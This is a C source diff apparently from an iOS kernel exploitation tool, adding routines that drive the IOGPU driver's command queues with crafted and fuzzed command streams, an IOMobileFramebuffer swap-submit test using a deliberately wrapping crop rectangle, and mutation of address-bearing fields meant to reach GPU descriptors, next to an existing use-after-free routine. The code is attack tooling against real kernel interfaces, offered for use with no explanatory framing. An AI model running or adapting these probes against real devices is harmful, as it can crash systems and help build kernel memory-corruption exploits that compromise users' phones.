@@ -2537,6 +2537,474 @@ static void p_submit2(void) {
     }
 }
 
+
+// V54: valid stream via sel12 shmems. entry rids = sel12 shmem ids!
+// A = kernel command shmem, B = segment list shmem.
+static uint32_t gpu_shmem(io_connect_t c, uint64_t size, uint8_t **va_out) {
+    uint8_t *out = must_map(0x1000);
+    memset(out, 0, 0x1000);
+    uint64_t a[2] = { size, 0 };
+    size_t osz = 0x10;
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+    kern_return_t kr = IOConnectCallMethod(c, 12, a, 2, NULL, 0, osc, &nosc, out, &osz);
+    uint64_t va = *(uint64_t *)out;
+    uint32_t id = *(uint32_t *)(out + 0xc);
+    LOG("[s4] sel12 size 0x%llx -> kr 0x%08x va %llx id %u", size, kr, va, id);
+    if (kr) return 0;
+    *va_out = (uint8_t *)(uintptr_t)va;
+    return id;
+}
+static void p_submit3(void) {
+    LOG("[v54] valid-stream submit");
+    io_connect_t c = open_service("IOGPU", 1);
+    if (!c) return;
+    uint8_t *in = must_map(0x2000);
+    uint8_t *out = must_map(0x1000);
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+    // notif queue + queue + bind
+    uint64_t a14[2] = { 0x100, 0x10 };
+    size_t osz = 0x10; nosc = 0;
+    kern_return_t kr = IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
+    uint64_t nqid = *(uint64_t *)(out + 8);
+    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
+    osz = 0x10; nosc = 0;
+    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
+    uint64_t qid = *(uint64_t *)out;
+    uint64_t a24[2] = { qid, nqid };
+    kern_return_t kb = IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL);
+    LOG("[s4] setup: nq %llu qid %llu bind 0x%08x", nqid, qid, kb);
+    if (!qid || !nqid || kb) return;
+
+    uint8_t *vaA, *vaB;
+    uint32_t idA = gpu_shmem(c, 0x4000, &vaA);
+    uint32_t idB = gpu_shmem(c, 0x4000, &vaB);
+    if (!idA || !idB) return;
+
+    uint8_t *entry = must_map(0x1000);
+    uint32_t *outw = (uint32_t *)must_map(0x100);
+
+    // T1: segment list = type2 end only (nothing executes)
+    memset(vaB, 0, 0x4000);
+    *(uint32_t *)(vaB + 0xc) = 0xC0000002;
+    memset(entry, 0, 0x1000);
+    *(uint32_t *)(entry + 0x00) = idA;
+    *(uint32_t *)(entry + 0x04) = idB;
+    *outw = 0xdeadbeef;
+    kern_return_t kt = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
+    LOG("[s4] T1 type2-end -> kr 0x%08x outw %08x", kt, *outw);
+    usleep(200000);
+
+    // T2: segment list with one pair (0,0x10) into command shmem A (zeros)
+    memset(vaA, 0, 0x4000);
+    memset(vaB, 0, 0x4000);
+    *(uint32_t *)(vaB + 0x8) = 1;              // count
+    *(uint32_t *)(vaB + 0xc) = 0xC0000001;     // hdr: end|bit30|type1
+    *(uint32_t *)(vaB + 0x10) = 0;             // lo
+    *(uint32_t *)(vaB + 0x14) = 0x10;          // hi
+    *outw = 0xdeadbeef;
+    kt = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
+    LOG("[s4] T2 seglist(0,0x10) -> kr 0x%08x outw %08x", kt, *outw);
+    usleep(200000);
+
+    // T3: type0 first command (submitCommandBuffer path)
+    memset(vaB, 0, 0x4000);
+    *(uint32_t *)(vaB + 0xc) = 0x80000000;     // end|type0 at offset 0
+    *outw = 0xdeadbeef;
+    kt = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
+    LOG("[s4] T3 type0 -> kr 0x%08x outw %08x", kt, *outw);
+    LOG("[v54] done (alive)");
+}
+
+
+// V55: fuzz kernel commands in shmem A via segment-list submissions.
+static void p_streamfuzz(long rounds) {
+    LOG("[v55] kernel command fuzz, %ld rounds", rounds);
+    io_connect_t c = open_service("IOGPU", 1);
+    if (!c) return;
+    uint8_t *in = must_map(0x2000);
+    uint8_t *out = must_map(0x1000);
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+    uint64_t a14[2] = { 0x100, 0x10 };
+    size_t osz = 0x10;
+    kern_return_t kr = IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
+    uint64_t nqid = *(uint64_t *)(out + 8);
+    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
+    osz = 0x10; nosc = 0;
+    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
+    uint64_t qid = *(uint64_t *)out;
+    uint64_t a24[2] = { qid, nqid };
+    if (IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL)) { LOG("[s5] bind fail"); return; }
+    uint8_t *vaA, *vaB;
+    uint32_t idA = gpu_shmem(c, 0x4000, &vaA);
+    uint32_t idB = gpu_shmem(c, 0x4000, &vaB);
+    if (!idA || !idB) return;
+    uint8_t *entry = must_map(0x1000);
+    uint32_t *outw = (uint32_t *)must_map(0x100);
+    memset(entry, 0, 0x1000);
+    *(uint32_t *)(entry + 0x00) = idA;
+    *(uint32_t *)(entry + 0x04) = idB;
+
+    // segment list: one pair covering a command region of A
+    *(uint32_t *)(vaB + 0x8) = 1;
+    *(uint32_t *)(vaB + 0xc) = 0xC0000001;
+    for (long r = 0; r < rounds; r++) {
+        // build 1-6 commands in A
+        memset(vaA, 0, 0x1000);
+        int ncmd = 1 + frand() % 6;
+        int off = 0;
+        for (int ci = 0; ci < ncmd && off < 0xf00; ci++) {
+            int len = (2 + frand() % 14) * 4;       // 8..0x3c, 4-aligned
+            *(uint32_t *)(vaA + off + 0x4) = len;
+            *(uint32_t *)(vaA + off + 0x0) = (uint32_t)frand();  // type/tag word?
+            for (int w = 2; w < len / 4; w++)
+                *(uint32_t *)(vaA + off + w * 4) = (frand() & 3)
+                    ? (uint32_t)frand() : (uint32_t)(frand() % 0x1000);
+            off += len;
+        }
+        *(uint32_t *)(vaB + 0x10) = 0;
+        *(uint32_t *)(vaB + 0x14) = off;
+        *outw = 0xdeadbeef;
+        kern_return_t k2 = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
+        if (*outw != 0xa && *outw != 9 && *outw != 8 && *outw != 0)
+            LOG("[s5] r%ld kr 0x%08x outw %08x", r, k2, *outw);
+        if (k2 != 0 && k2 != 0xe00002bc && (r & 0x3f) == 0)
+            LOG("[s5] r%ld kr 0x%08x outw %08x", r, k2, *outw);
+        if ((r & 0x3ff) == 0) usleep(1000);
+    }
+    LOG("[v55] done (alive)");
+}
+
+
+// V56: valid-type kernel command fuzz (grammar-aware)
+static void p_streamfuzz2(long rounds) {
+    LOG("[v56] grammar-aware command fuzz, %ld rounds", rounds);
+    io_connect_t c = open_service("IOGPU", 1);
+    if (!c) return;
+    uint8_t *in = must_map(0x2000);
+    uint8_t *out = must_map(0x1000);
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+    uint64_t a14[2] = { 0x100, 0x10 };
+    size_t osz = 0x10;
+    kern_return_t kr = IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
+    uint64_t nqid = *(uint64_t *)(out + 8);
+    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
+    osz = 0x10; nosc = 0;
+    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
+    uint64_t qid = *(uint64_t *)out;
+    uint64_t a24[2] = { qid, nqid };
+    if (IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL)) { LOG("[s6] bind fail"); return; }
+    uint8_t *vaA, *vaB;
+    uint32_t idA = gpu_shmem(c, 0x4000, &vaA);
+    uint32_t idB = gpu_shmem(c, 0x4000, &vaB);
+    if (!idA || !idB) return;
+    uint8_t *entry = must_map(0x1000);
+    uint32_t *outw = (uint32_t *)must_map(0x100);
+    memset(entry, 0, 0x1000);
+    *(uint32_t *)(entry + 0x00) = idA;
+    *(uint32_t *)(entry + 0x04) = idB;
+
+    // events via sel19 (for type 5/6 lookups)
+    uint32_t evids[16]; int nev = 0;
+    for (int i = 0; i < 16; i++) {
+        memset(out, 0, 0x1000);
+        uint64_t a19[1] = { 0 };
+        osz = 0x18; nosc = 0;
+        kr = IOConnectCallMethod(c, 19, a19, 1, NULL, 0, osc, &nosc, out, &osz);
+        if (kr == 0) { evids[nev++] = *(uint32_t *)out; }
+        else if (i == 0) LOG("[s6] sel19 -> kr 0x%08x", kr);
+    }
+    LOG("[s6] created %d events", nev);
+
+    // sanity: minimal valid stream (type2 command)
+    memset(vaA, 0, 0x4000);
+    *(uint32_t *)(vaA + 0x0) = 2;
+    *(uint32_t *)(vaA + 0x4) = 0x10;
+    memset(vaB, 0, 0x4000);
+    *(uint32_t *)(vaB + 0x8) = 1;
+    *(uint32_t *)(vaB + 0xc) = 0xC0000001;
+    *(uint32_t *)(vaB + 0x10) = 0;
+    *(uint32_t *)(vaB + 0x14) = 0x10;
+    *outw = 0xdeadbeef;
+    kern_return_t k0 = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
+    LOG("[s6] sanity type2 -> kr 0x%08x outw %08x (expect 0)", k0, *outw);
+
+    static const uint32_t types[] = { 2,3,4,5,6,8,9,0xa,0xb,0xc,0xd,0xe,0xf,0x10,0x11,0x12,0x10002,0x10004 };
+    int unusual = 0;
+    uint32_t round_types[8];
+    for (long r = 0; r < rounds; r++) {
+        memset(vaA, 0, 0x4000);
+        int ncmd = 1 + frand() % 4;
+        int off = 0;
+        int nrt = 0;
+        for (int ci = 0; ci < ncmd && off < 0x3800; ci++) {
+            uint32_t t = types[frand() % (sizeof(types)/4)];
+            if (nrt < 8) round_types[nrt++] = t;
+            int minlen = 0x18;
+            if (t == 2) minlen = 0x10;
+            if (t == 0xf) minlen = 0xb0;
+            if (t == 0x11) minlen = 0xc + (frand() % 4) * 0x10;
+            if (t == 0x10002) minlen = 0x108;
+            if (t == 8) minlen = 4 + (1 + frand() % 8) * 4;
+            int len = minlen + (frand() % 3) * 4;
+            if (off + len > 0x3f00) break;
+            *(uint32_t *)(vaA + off + 0x0) = t;
+            *(uint32_t *)(vaA + off + 0x4) = len;
+            // id field where applicable
+            if (nev && (frand() & 1)) *(uint32_t *)(vaA + off + 0x8) = evids[frand() % nev];
+            else *(uint32_t *)(vaA + off + 0x8) = (uint32_t)(frand() % 8);
+            for (int w = 3; w < len / 4; w++)
+                *(uint32_t *)(vaA + off + w * 4) = (frand() & 3)
+                    ? (uint32_t)frand() : (uint32_t)(frand() % 0x400);
+            off += len;
+        }
+        *(uint32_t *)(vaB + 0x14) = off;
+        *outw = 0xdeadbeef;
+        kern_return_t k2 = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
+        uint32_t ow = *outw;
+        if (ow != 0xa && ow != 9 && ow != 8 && ow != 0) {
+            if (unusual < 40) LOG("[s5] r%ld kr 0x%08x outw %08x types %x %x %x %x", r, k2, ow,
+                nrt>0?round_types[0]:0, nrt>1?round_types[1]:0, nrt>2?round_types[2]:0, nrt>3?round_types[3]:0);
+            unusual++;
+        }
+        if ((r & 0x1ff) == 0) usleep(500);
+    }
+    LOG("[v56] done (alive), unusual %d", unusual);
+}
+
+
+// V57: IOMFB swap_submit crop wraparound (sel4=begin-swap, sel5=submit).
+// crop {x:0x7ffffff0, y:0, w:0x80000010, h:1}: x+w wraps to 0 <= surfW.
+static void p_iomfb(void) {
+    LOG("[v57] IOMFB crop wrap test");
+    io_connect_t c = open_service("IOMobileFramebufferAP", 0);
+    if (!c) { LOG("[mfb] open failed"); return; }
+    IOSurfaceRef surf = make_surface(64, 64);
+    if (!surf) return;
+    IOSurfaceID sid = IOSurfaceGetID(surf);
+    uint8_t *st = must_map(0x1000);
+    for (int iter = 0; iter < 8; iter++) {
+        // begin-swap
+        uint64_t swap_id = 0; uint32_t cnt = 1;
+        kern_return_t kr = IOConnectCallScalarMethod(c, 4, NULL, 0, &swap_id, &cnt);
+        if (kr || !swap_id) { LOG("[mfb] sel4 -> kr 0x%08x id %llu", kr, swap_id); if (!iter) return; continue; }
+        memset(st, 0, 0x6e0);
+        *(uint32_t *)(st + 0x98) = (uint32_t)swap_id;    // swap id
+        *(uint32_t *)(st + 0x14c) = 1;                    // one layer
+        *(uint32_t *)(st + 0x9c) = sid;                   // surface id
+        // frame rect {0,0,dispW,dispH} (iPhone 15 Pro Max physical)
+        *(uint32_t *)(st + 0x10c) = 0;
+        *(uint32_t *)(st + 0x110) = 0;
+        *(uint32_t *)(st + 0x114) = 1290;
+        *(uint32_t *)(st + 0x118) = 2796;
+        // wrapped crop
+        *(uint32_t *)(st + 0xac) = 0x7ffffff0;            // x
+        *(uint32_t *)(st + 0xb0) = 0;                     // y
+        *(uint32_t *)(st + 0xb4) = 0x80000010;            // w (x+w wraps)
+        *(uint32_t *)(st + 0xb8) = 1;                     // h
+        uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+        size_t osz = 0;
+        kr = IOConnectCallMethod(c, 5, NULL, 0, st, 0x6e0, osc, &nosc, NULL, &osz);
+        LOG("[mfb] sel5 iter %d swap %llu -> kr 0x%08x", iter, swap_id, kr);
+        usleep(100000);
+    }
+    LOG("[v57] done (alive)");
+}
+
+
+// V58: stateful IOGPU command sequences — register object (type 3) then
+// reference it (0xb channel submit / 4 remove), per AGX grammar.
+static void p_stateful(long rounds) {
+    LOG("[v58] stateful command sequences, %ld rounds", rounds);
+    io_connect_t c = open_service("IOGPU", 1);
+    if (!c) return;
+    uint8_t *in = must_map(0x2000);
+    uint8_t *out = must_map(0x1000);
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+    uint64_t a14[2] = { 0x100, 0x10 };
+    size_t osz = 0x10;
+    kern_return_t kr = IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
+    uint64_t nqid = *(uint64_t *)(out + 8);
+    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
+    osz = 0x10; nosc = 0;
+    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
+    uint64_t qid = *(uint64_t *)out;
+    uint64_t a24[2] = { qid, nqid };
+    if (IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL)) return;
+    uint8_t *vaA, *vaB;
+    uint32_t idA = gpu_shmem(c, 0x4000, &vaA);
+    uint32_t idB = gpu_shmem(c, 0x4000, &vaB);
+    if (!idA || !idB) return;
+    uint8_t *entry = must_map(0x1000);
+    uint32_t *outw = (uint32_t *)must_map(0x100);
+    memset(entry, 0, 0x1000);
+    *(uint32_t *)(entry + 0x00) = idA;
+    *(uint32_t *)(entry + 0x04) = idB;
+    *(uint32_t *)(vaB + 0x8) = 1;
+    *(uint32_t *)(vaB + 0xc) = 0xC0000001;
+
+    static const uint32_t seq_types[] = { 3, 0xb, 4, 0xc, 0xd };
+    for (long r = 0; r < rounds; r++) {
+        memset(vaA, 0, 0x4000);
+        int off = 0;
+        // build a stateful sequence: register id X, use id X, remove id X
+        uint32_t oid = 1 + frand() % 8;
+        int ncmd = 2 + frand() % 4;
+        for (int ci = 0; ci < ncmd && off < 0x3800; ci++) {
+            uint32_t t = seq_types[frand() % (sizeof(seq_types)/4)];
+            int len = 0x18 + (frand() % 4) * 4;
+            *(uint32_t *)(vaA + off + 0x0) = t;
+            *(uint32_t *)(vaA + off + 0x4) = len;
+            *(uint32_t *)(vaA + off + 0x8) = (frand() & 2) ? oid : (uint32_t)(frand() % 12);
+            for (int w = 3; w < len / 4; w++)
+                *(uint32_t *)(vaA + off + w * 4) = (frand() & 3)
+                    ? (uint32_t)frand() : (uint32_t)(frand() % 0x400);
+            off += len;
+        }
+        *(uint32_t *)(vaB + 0x14) = off;
+        *outw = 0xdeadbeef;
+        kern_return_t k2 = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
+        uint32_t ow = *outw;
+        if (ow != 0xa && ow != 9 && ow != 8 && ow != 0)
+            LOG("[s8] r%ld kr 0x%08x outw %08x", r, k2, ow);
+        if ((r & 0x1ff) == 0) usleep(500);
+    }
+    LOG("[v58] done (alive)");
+}
+
+
+// V61: AGX inner commands (magic 0x10000, subtype dispatch). Goal: reach
+// case handlers (fn_0x831efb0 etc.) where tail qwords -> GPU descriptor.
+static void p_agxcmd(void) {
+    LOG("[v61] AGX command crafting");
+    io_connect_t c = open_service("IOGPU", 1);
+    if (!c) return;
+    uint8_t *in = must_map(0x2000);
+    uint8_t *out = must_map(0x1000);
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+    uint64_t a14[2] = { 0x100, 0x10 };
+    size_t osz = 0x10;
+    kern_return_t kr = IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
+    uint64_t nqid = *(uint64_t *)(out + 8);
+    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
+    osz = 0x10; nosc = 0;
+    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
+    uint64_t qid = *(uint64_t *)out;
+    uint64_t a24[2] = { qid, nqid };
+    if (IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL)) { LOG("[gx] bind fail"); return; }
+    uint8_t *vaA, *vaB;
+    uint32_t idA = gpu_shmem(c, 0x4000, &vaA);
+    uint32_t idB = gpu_shmem(c, 0x4000, &vaB);
+    if (!idA || !idB) return;
+    uint8_t *entry = must_map(0x1000);
+    uint32_t *outw = (uint32_t *)must_map(0x100);
+    memset(entry, 0, 0x1000);
+    *(uint32_t *)(entry + 0x00) = idA;
+    *(uint32_t *)(entry + 0x04) = idB;
+
+    // long fuzz: random tails per subtype; log any code != 0xa (deeper acceptance)
+    static const uint32_t subs[] = { 1, 2, 3, 6, 7 };
+    long accepted = 0;
+    for (long r = 0;; r++) {
+        uint32_t sub = subs[frand() % 5];
+        uint32_t tailLen = 4 + (frand() % 0x60) * 4;   // 4..0x17c
+        memset(vaA, 0, 0x4000);
+        uint32_t len = 0xc8 + tailLen;
+        *(uint32_t *)(vaA + 0x00) = 0x00010000;
+        *(uint32_t *)(vaA + 0x04) = len;
+        *(uint32_t *)(vaA + 0xa4) = tailLen;
+        *(uint32_t *)(vaA + 0xa8) = sub;
+        // semi-structured body (from +0x08, keep +0x8c must-be-zero area clean)
+        for (int w = 2; w < 0x21; w++)   // +0x08..+0x8b
+            *(uint32_t *)(vaA + w * 4) = (frand() & 3) ? (uint32_t)frand() : (uint32_t)(frand() % 0x100);
+        *(uint32_t *)(vaA + 0x8c) = 0;   // must be zero
+        for (uint32_t t = 0; t < tailLen; t += 4)
+            *(uint32_t *)(vaA + 0xc8 + t) = (frand() & 3) ? (uint32_t)frand() : (uint32_t)(frand() % 0x400);
+        memset(vaB, 0, 0x4000);
+        *(uint32_t *)(vaB + 0x8) = 1;
+        *(uint32_t *)(vaB + 0xc) = 0xC0000001;
+        *(uint32_t *)(vaB + 0x10) = 0;
+        *(uint32_t *)(vaB + 0x14) = len;
+        *outw = 0xdeadbeef;
+        kern_return_t k2 = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
+        uint32_t ow = *outw;
+        if (ow != 0xa) {
+            LOG("[gx] r%ld subtype %u tailLen 0x%x -> kr 0x%08x outw %08x", r, sub, tailLen, k2, ow);
+            accepted++;
+        }
+        if ((r & 0x3ff) == 0) usleep(1000);
+        if (r >= 200000) { LOG("[gx] capped at 200k, accepted %ld", accepted); break; }
+        if (r && (r % 500000) == 0) LOG("[gx] r%ld alive, accepted %ld", r, accepted);
+    }
+}
+
+
+// V64: full-length tails for subtype 1/2 (accepted by parsers), then mutate
+// documented address-qword offsets (verbatim into GPU descriptor).
+static void p_agxtail(void) {
+    LOG("[v64] AGX tail crafting");
+    io_connect_t c = open_service("IOGPU", 1);
+    if (!c) return;
+    uint8_t *in = must_map(0x2000);
+    uint8_t *out = must_map(0x1000);
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+    uint64_t a14[2] = { 0x100, 0x10 };
+    size_t osz = 0x10;
+    kern_return_t kr = IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
+    uint64_t nqid = *(uint64_t *)(out + 8);
+    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
+    osz = 0x10; nosc = 0;
+    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
+    uint64_t qid = *(uint64_t *)out;
+    uint64_t a24[2] = { qid, nqid };
+    if (IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL)) { LOG("[tl] bind fail"); return; }
+    uint8_t *vaA, *vaB;
+    uint32_t idA = gpu_shmem(c, 0x8000, &vaA);   // bigger: tails up to 0x9a8+0xc8
+    uint32_t idB = gpu_shmem(c, 0x4000, &vaB);
+    if (!idA || !idB) return;
+    uint8_t *entry = must_map(0x1000);
+    uint32_t *outw = (uint32_t *)must_map(0x100);
+    memset(entry, 0, 0x1000);
+    *(uint32_t *)(entry + 0x00) = idA;
+    *(uint32_t *)(entry + 0x04) = idB;
+
+    // subtype-1 address-bearing qword offsets in tail (from statics)
+    static const uint32_t addr_offs[] = { 0x138, 0x140, 0x24c, 0x638 };
+    for (long r = 0;; r++) {
+        uint32_t sub = (r & 1) ? 2 : 1;
+        uint32_t tailLen = (sub == 1) ? 0x9a8 : 0x480;
+        memset(vaA, 0, 0x4000);
+        uint32_t len = 0xc8 + tailLen;
+        *(uint32_t *)(vaA + 0x00) = 0x00010000;
+        *(uint32_t *)(vaA + 0x04) = len;
+        *(uint32_t *)(vaA + 0xa4) = tailLen;
+        *(uint32_t *)(vaA + 0xa8) = sub;
+        // mutate one address field per round
+        if (r >= 4) {
+            uint32_t off = addr_offs[frand() % 4];
+            uint64_t val;
+            switch (frand() % 4) {
+                case 0: val = 0; break;
+                case 1: val = frand() % 0x100000; break;                  // small GPUVA
+                case 2: val = 0x100000000ULL + (frand() % 0x1000000); break;
+                default: val = frand(); break;
+            }
+            *(uint64_t *)(vaA + 0xc8 + off) = val;
+        }
+        memset(vaB, 0, 0x4000);
+        *(uint32_t *)(vaB + 0x8) = 1;
+        *(uint32_t *)(vaB + 0xc) = 0xC0000001;
+        *(uint32_t *)(vaB + 0x10) = 0;
+        *(uint32_t *)(vaB + 0x14) = len;
+        *outw = 0xdeadbeef;
+        kern_return_t k2 = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
+        uint32_t ow = *outw;
+        if (r < 4 || ow != 0xa)
+            LOG("[tl] r%ld subtype %u -> kr 0x%08x outw %08x", r, sub, k2, ow);
+        if ((r & 0x3ff) == 0) usleep(1000);
+        if (r && (r % 200000) == 0) LOG("[tl] r%ld alive", r);
+    }
+}
+
 static void p4b_uaf2(void) {
     LOG("[v13-d] UAF destroy-first (panic tolerated)");
     IOSurfaceRef big1 = make_surface(2048, 2048);
@@ -2667,6 +3135,13 @@ void *t_iosurface_scaler(void *arg) {
     static int probed = 0;
     if (!probed) {
         probed = 1;
+        p_agxtail();        // v64: AGX tail crafting
+        p_agxcmd();         // v61: AGX command crafting
+        p_stateful(1000000); // v58: stateful IOGPU sequences
+        p_iomfb();          // v57: IOMFB crop wrap
+        p_streamfuzz2(2000000); // v56: grammar-aware fuzz
+        p_streamfuzz(500000); // v55: kernel command fuzz
+        p_submit3();        // v54: valid-stream submit
         p_submit2();        // v52: submit with notif-queue
         p_submit();         // v50: end-to-end submit
         p_qdrive();         // v49: queue shmem drive
